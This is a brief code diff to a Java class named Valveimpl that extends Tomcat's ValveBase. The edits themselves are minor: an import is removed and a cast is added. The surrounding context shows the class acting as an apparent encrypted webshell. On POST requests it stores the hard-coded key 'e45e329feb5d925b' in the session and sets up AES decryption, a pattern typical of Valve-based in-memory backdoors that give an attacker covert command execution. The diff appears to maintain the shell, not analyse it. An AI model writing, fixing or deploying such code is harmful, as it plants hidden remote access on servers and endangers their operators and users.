@@ -1,4 +1,3 @@
-import org.apache.catalina.Valve;
 import org.apache.catalina.connector.Request;
 import org.apache.catalina.connector.Response;
 import org.apache.catalina.valves.ValveBase;
@@ -23,7 +22,7 @@ public class Valveimpl extends ValveBase {
                 if (request.getMethod().equals("POST")) {
                     try {
                         String k = "e45e329feb5d925b";
-                        HttpSession session = request.getSession();
+                        HttpSession session = (HttpSession) request.getSession();
                         session.putValue("u", k);
                         Cipher c = Cipher.getInstance("AES");
                         c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
